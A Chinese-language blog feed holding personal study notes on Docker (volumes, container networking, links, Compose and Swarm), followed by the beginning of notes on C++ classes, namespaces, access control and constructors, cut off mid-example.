为了指定新的 Registry 的地址, 需要在镜像名前加上主机名和端口前缀:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo docker <span class="hljs-keyword">push</span> docker.example.com:<span class="hljs-number">5000</span><span class="hljs-regexp">/jamtur01/</span>static_web<br></code></pre></td></tr></table></figure><p>使用其构建新容器:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -t -i docker.example.com:5000/jamtur01/static_web</span><br></code></pre></td></tr></table></figure><h2 id="4-9-其他可选的-Registry-服务"><a href="#4-9-其他可选的-Registry-服务" class="headerlink" title="4.9 其他可选的 Registry 服务"></a>4.9 其他可选的 Registry 服务</h2><h1 id="第5章-在测试中使用-Docker"><a href="#第5章-在测试中使用-Docker" class="headerlink" title="第5章 在测试中使用 Docker"></a>第5章 在测试中使用 Docker</h1><h2 id="5-1-使用-Docker-测试静态网站"><a href="#5-1-使用-Docker-测试静态网站" class="headerlink" title="5.1 使用 Docker 测试静态网站"></a>5.1 使用 Docker 测试静态网站</h2><p>将 Docker 作为本地 Web 开发环境是 Docker 的一个最简单的应用场景。</p><p>要想保持 Docker 容器的活跃状态，需要其中运行的进程不能中断，默认情况下，Nginx 会以守护进程的方式启动，这会导致容器只是短暂运行，在守护进程被 fork 后，发起守护进程的原始进程就会退出，这时容器就停止运行了.</p><h3 id="5-1-2-构建-Sample-网站和-Nginx-镜像"><a href="#5-1-2-构建-Sample-网站和-Nginx-镜像" class="headerlink" title="5.1.2 构建 Sample 网站和 Nginx 镜像"></a>5.1.2 构建 Sample 网站和 Nginx 镜像</h3><h3 id="5-1-3-从-Sample-网站和-Nginx-镜像构建容器"><a href="#5-1-3-从-Sample-网站和-Nginx-镜像构建容器" class="headerlink" title="5.1.3 从 Sample 网站和 Nginx 镜像构建容器"></a>5.1.3 从 Sample 网站和 Nginx 镜像构建容器</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -d -p <span class="hljs-number">80</span> --name website -v <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/website:/</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/website jamtur01/</span>nginx nginx<br></code></pre></td></tr></table></figure><p>这里的 <code>-v</code> 选项允许我们将宿主机的目录作为卷，挂载到容器里。</p><p>两个目录用 <code>:</code> 分隔，前者为宿主机目录，后者为容器目录，如果容器目录不存在，Docker 会自动创建一个。</p><p>可以通过在目录后面加上 <code>rw</code> 或 <code>ro</code> 来指定容器内目录的读写状态:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -d -p <span class="hljs-number">80</span> --name website -v <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/website:/</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/website:ro jamtur01/</span>nginx nginx<br></code></pre></td></tr></table></figure><h4 id="卷的概念"><a href="#卷的概念" class="headerlink" title="卷的概念"></a>卷的概念</h4><p>卷是在一个或者多个容器内被选定的目录，可以绕过分层的联合文件系统，为 Docker 提供持久数据或者共享数据。</p><p>对卷的修改会立即生效，并绕过镜像，当提交或者创建镜像时，卷不被包含在镜像里。</p><p>卷是从宿主机而来。</p><h3 id="5-1-4-修改网站"><a href="#5-1-4-修改网站" class="headerlink" title="5.1.4 修改网站"></a>5.1.4 修改网站</h3><p>直接修改本地宿主机的 website 目录下的 index.html 文件, 也就是卷内的文件:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ vim <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/website/i</span>ndex.html<br></code></pre></td></tr></table></figure><h2 id="5-2-使用-Docker-构建并测试-Web-应用程序"><a href="#5-2-使用-Docker-构建并测试-Web-应用程序" class="headerlink" title="5.2 使用 Docker 构建并测试 Web 应用程序"></a>5.2 使用 Docker 构建并测试 Web 应用程序</h2><p>Sinatra 是一个基于 Ruby 的 Web 应用框架，它包含一个 Web 应用库，以及简单的领域专用语言 (DSL) 来构建 Web 应用。</p><p>Sinatra 非常适合用来创建一个小型的示例应用进行测试。</p><h3 id="5-2-1-构建-Sinatra-应用程序"><a href="#5-2-1-构建-Sinatra-应用程序" class="headerlink" title="5.2.1 构建 Sinatra 应用程序"></a>5.2.1 构建 Sinatra 应用程序</h3><h3 id="5-2-4-将-Sinatra-应用程序连接到-Redis-容器"><a href="#5-2-4-将-Sinatra-应用程序连接到-Redis-容器" class="headerlink" title="5.2.4 将 Sinatra 应用程序连接到 Redis 容器"></a>5.2.4 将 Sinatra 应用程序连接到 Redis 容器</h3><p>两种比较现实的连接 Docker 容器的方法是:</p><ul><li>Docker Networking, Docker 1.9 及更新版本推荐使用</li><li>Docker link, Docker 1.9 之前版本推荐使用</li></ul><p>Docker Networking 和 Docker link 的区别:</p><ul><li>Docker Networking 可以将容器连接到不同宿主机上的容器</li><li>通过 Docker Networking 连接的容器可以在无需更新连接的情况下，对停止、启动或者重启容器。</li><li>使用 Docker Networking, 不必事先创建容器再去连接它。同样不必关心容器的运行顺序。</li></ul><h3 id="5-2-5-Docker-内部连网"><a href="#5-2-5-Docker-内部连网" class="headerlink" title="5.2.5 Docker 内部连网"></a>5.2.5 Docker 内部连网</h3><p>在安装 Docker 时，会创建一个新的网络接口，名字是 docker0.</p><p>每个 Docker 容器都会在这个接口上分配一个 IP 地址。</p><p>启动 IPv6, 在运行 Docker 守护进程时加上 <code>--ipv6</code> 标志.</p><p>接口本身的地址是这个 Docker 网络的网关地址，也是所有 Docker 容器的网关地址。</p><p>Docker 会默认使用 172.17.x.x 作为子网地址，除非被占用，Docker 就会在 172.16~172.30 这个范围内尝试创建子网.</p><p>Docker 每创建一个容器就会创建一组互联的网络接口，其中一端作为容器里的 eth0 接口，而另一端统一命名为 vethec6a 这种名字，作为宿主机的一个端口.</p><p>通过把每个 veth* 接口绑定到 docker0 网桥，Docker 创建了一个虚拟子网，这个子网由宿主机和所有的 Docker 容器共享。</p><p>从容器内跟踪路由:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"># apt-<span class="hljs-built_in">get</span> -yqq <span class="hljs-keyword">update</span> &amp;&amp; apt-<span class="hljs-built_in">get</span> install -yqq traceroute<br># traceroute google.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>查看宿主机的 IPTables NAT 配置:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">$ sudo iptables -<span class="hljs-built_in">t</span> nat -L -<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>Docker 默认会把公开的端口绑定到所有的网络接口上。</p><p>如果重启容器，Docker 会改变容器的 IP 地址.</p><h3 id="5-2-6-Docker-Networking"><a href="#5-2-6-Docker-Networking" class="headerlink" title="5.2.6 Docker Networking"></a>5.2.6 Docker Networking</h3><p>容器之间的连接用网络创建，被称为 Docker Networking.</p><p>Docker Networking 允许用户创建自己的网络，容器可以通过这个网上互相通信.</p><p>使用 Docker Networking 需先创建一个网络，然后在这个网络下启动容器:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker network create app<br></code></pre></td></tr></table></figure><p><code>create</code> 后接名称.</p><p>查看新创建的网络:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ sudo docker network <span class="hljs-keyword">inspect</span> <span class="hljs-keyword">app</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.docker.com/engine/userguide/networking/get-started-overlay/">Docker 多宿主机网络文档</a></p><p>列出当前系统中的所有网络:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> docker network <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>删除一个 Docker 网络:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> docker network <span class="hljs-built_in">rm</span><br></code></pre></td></tr></table></figure><p>添加容器:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> -d <span class="hljs-attribute">--net</span>==app --name db jamtur01/redis<br></code></pre></td></tr></table></figure><p><code>--net</code> 标志指定了新容器将会在哪个网络中运行。</p><p>Docker 会感知所有在这个网络下运行的容器，并且通过 <code>/etc/hosts</code> 文件将这些容器的地址保存到本地 DNS 中。</p><p><code>app</code> 网络内部的任何主机都可以使用 <code>hostname.app</code> 形式来被解析。</p><p>在宿主机下如:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ ping <span class="hljs-keyword">db</span>.<span class="hljs-keyword">app</span><br></code></pre></td></tr></table></figure><h4 id="将已有容器连接到-Docker-网络"><a href="#将已有容器连接到-Docker-网络" class="headerlink" title="将已有容器连接到 Docker 网络"></a>将已有容器连接到 Docker 网络</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker network connect app db2<br></code></pre></td></tr></table></figure><p>这里 <code>app</code> 为网络名称，<code>db2</code> 为容器名称.</p><h4 id="断开一个容器与指定网络的链接"><a href="#断开一个容器与指定网络的链接" class="headerlink" title="断开一个容器与指定网络的链接"></a>断开一个容器与指定网络的链接</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker network disconnect app db2<br></code></pre></td></tr></table></figure><p>一个容器可以同时隶属多个 Docker Networking.</p><h4 id="通过-Docker-link-连接容器"><a href="#通过-Docker-link-连接容器" class="headerlink" title="通过 Docker link 连接容器"></a>通过 Docker link 连接容器</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -p <span class="hljs-number">4567</span> --name webapp --link redis:db -t -i -v <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/webapp_redis:/</span>opt<span class="hljs-regexp">/webapp jamtur01/</span>sinatra <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p><code>--link</code> 标志，用于创建两个容器间的客户-服务链接。其需要两个参数，前者是要链接的容器的名称，后一个是这个链接的别名。这里 <code>webapp</code> 是客户，<code>redis</code> 是”服务”.</p><p>通过把容器链接在一起，可以让客户容器直接访问任意服务容器的公开端口.</p><p>只有使用 <code>--link</code> 标志链接到这个容器的容器才能连接到这个端口。</p><p>可以把多个容器链接在一起:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ sudo docker run -p 4567 <span class="hljs-params">--name</span> webapp2 <span class="hljs-params">--link</span> redis<span class="hljs-function">:db</span> <span class="hljs-string">...</span><br>$ sudo docker run -p 4567 <span class="hljs-params">--name</span> webapp3 <span class="hljs-params">--link</span> redis<span class="hljs-function">:db</span> <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>在运行容器时指定 <code>--add-host</code> 选项，可以在 <code>/etc/hosts</code> 文件中添加相应的记录:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> -p 4567 <span class="hljs-attribute">--add-host</span>=docker:10.0.0.1 <span class="hljs-built_in">..</span>.<br></code></pre></td></tr></table></figure><p>在容器中可以用 <code>env</code> 命令查看新创建的环境变量的信息.</p><h3 id="5-2-7-使用容器连接来通信"><a href="#5-2-7-使用容器连接来通信" class="headerlink" title="5.2.7 使用容器连接来通信"></a>5.2.7 使用容器连接来通信</h3><h2 id="5-3-Docker-用于持续集成"><a href="#5-3-Docker-用于持续集成" class="headerlink" title="5.3 Docker 用于持续集成"></a>5.3 Docker 用于持续集成</h2><p>即在多开发者的持续集成测试场景中使用 Docker.</p><h1 id="第6章-使用-Docker-构建服务"><a href="#第6章-使用-Docker-构建服务" class="headerlink" title="第6章 使用 Docker 构建服务"></a>第6章 使用 Docker 构建服务</h1><h2 id="6-1-构建第一个应用"><a href="#6-1-构建第一个应用" class="headerlink" title="6.1 构建第一个应用"></a>6.1 构建第一个应用</h2><h3 id="6-1-1-JekyII-基础镜像"><a href="#6-1-1-JekyII-基础镜像" class="headerlink" title="6.1.1 JekyII 基础镜像"></a>6.1.1 JekyII 基础镜像</h3><h3 id="6-1-2-构建-Jekyll-基础镜像"><a href="#6-1-2-构建-Jekyll-基础镜像" class="headerlink" title="6.1.2 构建 Jekyll 基础镜像"></a>6.1.2 构建 Jekyll 基础镜像</h3><h3 id="6-1-5-启动-Jekyll-网站"><a href="#6-1-5-启动-Jekyll-网站" class="headerlink" title="6.1.5 启动 Jekyll 网站"></a>6.1.5 启动 Jekyll 网站</h3><p>启动一个叫做 <code>james_blog</code> 的新容器, 把本地的 james_blog 目录作为 <code>/data/</code> 卷挂载到容器里:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -v <span class="hljs-regexp">/home/</span>james<span class="hljs-regexp">/james_blog:/</span>data/ \<br>--name james_blog jamtur01/jekyll<br></code></pre></td></tr></table></figure><p>卷在 Docker 宿主机的 <code>/var/lib/docker/volumes</code> 目录中, 可以通过 <code>docker inspect</code> 命令查看某个卷的具体位置.</p><p>如果想在另一个容器里使用 <code>/var/www/html/</code> 卷里编译好的网站, 可以建立一个新的链接到这个卷的容器:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo docker <span class="hljs-built_in">run</span> -d -P <span class="hljs-comment">--volumes-from jemes_blog jamtur01/apache 091570cc2267</span><br></code></pre></td></tr></table></figure><p><code>--volumes-from</code> 标志, 把指定容器里的所有卷都加入新创建的容器里.</p><p>卷 这个概念感觉实际上就是挂载, 你在 Docker 里面修改了这个 卷 里的内容, 宿主机上面的目录也会更新.</p><h3 id="6-1-7-备份-Jekyll-卷"><a href="#6-1-7-备份-Jekyll-卷" class="headerlink" title="6.1.7 备份 Jekyll 卷"></a>6.1.7 备份 Jekyll 卷</h3><p>如:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> --volumes-from james_blog \</span><br><span class="language-bash">-v $(<span class="hljs-built_in">pwd</span>):/backup ubuntu \</span><br><span class="language-bash">tar cvf /backup/james_blog_backup.tar /var/www/html</span><br></code></pre></td></tr></table></figure><p>上面命令的解释为, <code>--rm</code> 参数表明会在容器的进程运行完毕后, 自动删除容器, <code>--volumes-from james_blog</code> 指定从哪个容器中获取 volumes, <code>-v $(pwd):/backup</code> 将当前目录 (即用来存备份文件的目录) 挂载到容器中的 <code>/backup</code> 目录下, <code>ubuntu</code> 是 image 的名称, <code>tar cvf /backup/james_blog_backup.tar /var/www/html</code> 是将 <code>/var/www/html</code> 打包为 <code>/backup/james_blog_backup.tar</code> 文件.</p><h3 id="6-1-8-扩展-Jekyll-示例网站"><a href="#6-1-8-扩展-Jekyll-示例网站" class="headerlink" title="6.1.8 扩展 Jekyll 示例网站"></a>6.1.8 扩展 Jekyll 示例网站</h3><h2 id="6-2-使用-Docker-构建一个-Java-应用服务"><a href="#6-2-使用-Docker-构建一个-Java-应用服务" class="headerlink" title="6.2 使用 Docker 构建一个 Java 应用服务"></a>6.2 使用 Docker 构建一个 Java 应用服务</h2><h3 id="6-2-1-WAR-文件的获取程序"><a href="#6-2-1-WAR-文件的获取程序" class="headerlink" title="6.2.1 WAR 文件的获取程序"></a>6.2.1 WAR 文件的获取程序</h3><h2 id="6-3-多容器的应用栈"><a href="#6-3-多容器的应用栈" class="headerlink" title="6.3 多容器的应用栈"></a>6.3 多容器的应用栈</h2><p><code>docker run</code> 中的 <code>-h</code> 标志, 用于指定容器的主机名. </p><h2 id="6-4-不使用-SSH-管理-Docker-容器"><a href="#6-4-不使用-SSH-管理-Docker-容器" class="headerlink" title="6.4 不使用 SSH 管理 Docker 容器"></a>6.4 不使用 SSH 管理 Docker 容器</h2><p>传统上讲, 通过 SSH 登入运行环境或者虚拟机来管理服务.</p><p>在 Docker 里, 大部分容器都只运行一个进程, 所以不能使用这种访问方法.</p><p>需要登入容器时, 可以使用 <code>nsenter</code> 工具.</p><p>nsenter 可以进入一个已经存在的容器的 shell, 即便这个容器没有运行 SSH 或任何类似目的的守护进程. 可以通过 Docker 容器安装 nsenter:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -v <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin:/</span>target jpetazzo/nsenter<br></code></pre></td></tr></table></figure><p>具体见书.</p><h1 id="第7章-Docker-编配和服务发现"><a href="#第7章-Docker-编配和服务发现" class="headerlink" title="第7章 Docker 编配和服务发现"></a>第7章 Docker 编配和服务发现</h1><p>Docker Compose 是 Docker 的编配工具.</p><h2 id="7-1-Docker-Compose"><a href="#7-1-Docker-Compose" class="headerlink" title="7.1 Docker Compose"></a>7.1 Docker Compose</h2><p>使用 Docker Compose, 可以用一个 YAML 文件定义一组要启动的容器, 以及容器运行时的属性. Docker Compose 称这些容器为 “服务”.</p><h3 id="7-1-1-安装-Docker-Compose"><a href="#7-1-1-安装-Docker-Compose" class="headerlink" title="7.1.1 安装 Docker Compose"></a>7.1.1 安装 Docker Compose</h3><p>三种方法:</p><ul><li>直接安装</li><li>Docker Toolbox</li><li>Python Pip</li></ul><p>如:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo pip <span class="hljs-keyword">install</span> -U docker-compose<br></code></pre></td></tr></table></figure><p>具体见书.</p><h3 id="7-1-2-获取示例应用"><a href="#7-1-2-获取示例应用" class="headerlink" title="7.1.2 获取示例应用"></a>7.1.2 获取示例应用</h3><h3 id="7-1-3-docker-compose-yml-文件"><a href="#7-1-3-docker-compose-yml-文件" class="headerlink" title="7.1.3 docker-compose.yml 文件"></a>7.1.3 docker-compose.yml 文件</h3><p>执行 <code>docker-compose up</code> 命令, Compose 会启动这些容器, 使用指定的参数来执行, 并将所有日志输出合并到一起. </p><p>示例 <code>docker-compose.yml</code> 文件:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">jamtur01/composeapp</span><br>    <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">python app.py</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;5000:5000&quot;</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">.:/composeapp</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br></code></pre></td></tr></table></figure><p><code>links</code> 指定了要连接到服务的其他服务.</p><p>可以在 Docker Compose 官网查看 docker-compose.yml 所有可用指令列表. <a href="https://docs.docker.com/compose/compose-file/">位置</a></p><h3 id="7-1-4-运行-Compose"><a href="#7-1-4-运行-Compose" class="headerlink" title="7.1.4 运行 Compose"></a>7.1.4 运行 Compose</h3><p>创建并启动服务:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker-compose up<br></code></pre></td></tr></table></figure><p>为了保证服务是唯一的, Compose 将 docker-compose.yml 文件中指定的服务名称加上目录名作为前缀, 并分别使用数字作为后缀.</p><p>Compose 之后接管了每个服务输出的日志, 输出的日志每一行都使用缩短的服务名称最为前缀, 并交替输出在一起.</p><p>服务和 Compose 交替运行, 这意味着, 如果使用 <code>Ctrl+C</code> 来停止 Compose 运行, 也会停止运行的服务.</p><p>可以在运行 <code>Compose</code> 时指定 <code>-d</code> 标志, 其将以守护进程来运行服务.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="7-1-5-使用-Compose"><a href="#7-1-5-使用-Compose" class="headerlink" title="7.1.5 使用 Compose"></a>7.1.5 使用 Compose</h3><p>可以用 <code>docker-compose ps</code> 命令来查看服务的运行状态:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker-copose ps<br></code></pre></td></tr></table></figure><p>使用 <code>docker-compose help +命令</code> 来查看相关用法. </p><p><code>docker-compose stop</code> 可以停止正在运行的服务.</p><p><code>docker-compose kill</code> 强制杀死服务.</p><p>使用 <code>docker-compose start</code> 命令重启.</p><p><code>docker-compose rm</code> 来删除这些服务.</p><h2 id="7-3-Docker-Swarm"><a href="#7-3-Docker-Swarm" class="headerlink" title="7.3 Docker Swarm"></a>7.3 Docker Swarm</h2><p>Docker Swarm 是一个原生的 Docker 集群管理工具.</p><p>Swarm 将一组 Docker 主机作为一个虚拟的 Docker 主机来管理.</p><h3 id="7-3-1-安装-Swarm"><a href="#7-3-1-安装-Swarm" class="headerlink" title="7.3.1 安装 Swarm"></a>7.3.1 安装 Swarm</h3><p>拉取 Docker 公司提供的 <code>swarm</code> 镜像即可:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker pull swarm<br></code></pre></td></tr></table></figure><p>运行 Swarm 的所有 Docker 节点都必须运行统一个版本的 Docker.</p><h3 id="7-3-2-创建-Swarm-集群"><a href="#7-3-2-创建-Swarm-集群" class="headerlink" title="7.3.2 创建 Swarm 集群"></a>7.3.2 创建 Swarm 集群</h3><p>集群中的每台主机上都运行着一个 <mark> Swarm 节点代理</mark> , 每个代理都将改主机上的相关 Docker 守护进程注册到集群中.</p><p>和节点代理相对的是 Swarm 的管理者, 用于对集群进行管理.</p><p>通过集群发现后端 (discovery backend, 如 Docker Hub) 来实现集群注册. 默认为 Docker Hub.</p><p>在 Docker Hub 中注册一个集群, 然后返回一个集群 ID, 之后使用这个集群 ID 向集群添加额外的节点.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> swarm create<br></code></pre></td></tr></table></figure><p>此命令会返回一个 字符串, 即集群 ID.</p><p>运行 Swarm 代理:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">smoker $ docker run -d swarm <span class="hljs-built_in">join</span> --addr=10.0.0.125:2375 \<br> token://b811b0bc438sifjvajhfiakfidjcbaj83hai<br></code></pre></td></tr></table></figure><p>使用 <code>join</code> 并用 <code>--addr</code> 传递本机 IP 地址.</p><p><code>token://b811b0bc438sifjvajhfiakfidjcbaj83hai</code> 这一串就是指定2集群 ID.</p><p>查看代理节点的列表:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> swarm list token://b811b0bc438sifjvajhfiakfidjcbaj83hai<br></code></pre></td></tr></table></figure><p>可在任意安装了 Docker 的主机上执行.</p><p>创建 Swarm 集群管理者:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -d -p 2380:2375 swarm manage token://b811b0bc438sifjvajhfiakfidjcbaj83hai<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++ 网页学习</title>
    <link href="/2022/08/25/C++%20%E7%BD%91%E9%A1%B5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/25/C++%20%E7%BD%91%E9%A1%B5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="http://c.biancheng.net/view/2189.html">C语言中文网</a></p><h2 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h2><p>C中<code>struct</code>和C++中<code>class</code>区别，<code>class</code>有成员函数。</p><h3 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h3><p>用类创建对象，称作类的实例化，这个对象也称作类的实例(instance)</p><hr><p>类的成员有时称类的<mark>属性, property</mark>，成员函数有时称<mark>方法, method</mark>。</p><h3 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h3><p>Object Oriented Progremming, OOP.</p><h2 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h2><p>定义名称空间用<code>namespace</code>关键字。</p><pre><code class="hljs">namespace Zhou&#123;    Int own = 10000;&#125;</code></pre><h3 id="域解析操作符"><a href="#域解析操作符" class="headerlink" title="域解析操作符"></a>域解析操作符</h3><p><code>::</code>, 用来指明要使用的名称空间。</p><pre><code class="hljs">using Zhou::own;    #声明名称空间中的一个变量using namespace Zhou;   #声明整个名称空间</code></pre><p>中大型程序开发不推荐把名称空间声明在外部，这样会增加命名冲突的风险。</p><h2 id="1-8"><a href="#1-8" class="headerlink" title="1.8"></a>1.8</h2><h3 id="C-布尔类型"><a href="#C-布尔类型" class="headerlink" title="C++布尔类型"></a>C++布尔类型</h3><p><code>bool</code>类型，一般长度占1个字节，有两个值<code>true</code>和<code>false</code>, true代表真，false代表假。</p><p>可以使用true和false显式赋值：</p><pre><code class="hljs">bool flag = true;</code></pre><h2 id="2-3"><a href="#2-3" class="headerlink" title="2.3"></a>2.3</h2><h3 id="成员访问限定符"><a href="#成员访问限定符" class="headerlink" title="成员访问限定符"></a>成员访问限定符</h3><p><code>public``protected``private</code>, 分别表示公有的，受保护的，私有的，被称为成员访问限定符。</p><p><mark>访问权限</mark>，就是指你能不能使用该类中的成员。</p><p>成员函数的定义和声明一般也会分开。</p><p>对<code>public</code>和<code>private</code>的理解。</p><p><code>public</code>指可以通过对象进行访问和修改，你可以在类外使用<code>public</code>定义的成员。</p><p><code>private</code>指不能够使用对象访问和修改，你不能在类外使用，只有在类那个大括号内，才能使用<code>private</code>成员。</p><p>可以使用<code>public</code>的成员函数修改<code>private</code>的成员。</p><p>成员变量大都以<code>m_</code>开头，这是约定俗成的写法。以<code>m_</code>开头可以一眼看出这是成员变量，又可以和成员函数中的形参名字区别开。</p><p>声明为<code>protected</code>，则只能在派生类内部可以使用。</p><p>给成员变量赋值的函数通常称为set函数，他们的名字通常以<code>set</code>开头。</p><p>读取成员变量的值的函数通常称get函数，他们的名字通常以<code>get</code>开头, 然后根跟成员变量的名字。</p><p><mark>类的封装性</mark><br>这种将成员变量声明为<code>private</code>，将部分成员函数声明为<code>public</code>的做法。</p><p>声明为public和private的顺序任意，若没有public和private关键词，则默认为private</p><h2 id="2-6"><a href="#2-6" class="headerlink" title="2.6"></a>2.6</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>名称和类相同，没有返回值，在创建对象时自动执行。</p><p>想要调用构造函数，就得在创建对象时传递实参。</p><p>构造函数必须是public属性，不然无法调用。</p><p>构造函数不允许出现返回值和return。</p><p><mark>构造函数的重载</mark><br>一个类可以有多个重载的构造函数。</p><p>构造函数的调用是强制性的，一旦在类中定义了构造函数，那么创建对象是就一定要调用.</p><p><mark>默认构造函数</mark><br>用户没有自己定义构造函数时，由编译器自动生成。</p><p>调用没有参数的构造函数时可以省略括号。</p><p><mark>初始化列表</mark><br>格式：</p><pre><code class="hljs">Stedunt::Student(char *name, int age, float score): m_name(name), m_age(age), 